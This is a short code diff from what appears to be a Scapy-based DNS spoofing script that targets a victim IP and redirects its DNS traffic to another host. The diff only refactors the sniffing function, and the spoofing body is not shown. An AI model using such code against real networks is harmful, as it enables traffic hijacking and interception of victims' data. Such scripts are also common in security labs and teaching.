@@ -5,7 +5,7 @@ victimIP = "10.5.1.2"
 gotoIP = "10.5.1.3"
 
 
-def sniffDNS(victimIP):
+def sniffDNS():
 	sniff(filter="udp and port 53 and host " + victimIP, prn = spoofDNS)
 
 def spoofDNS(packet):
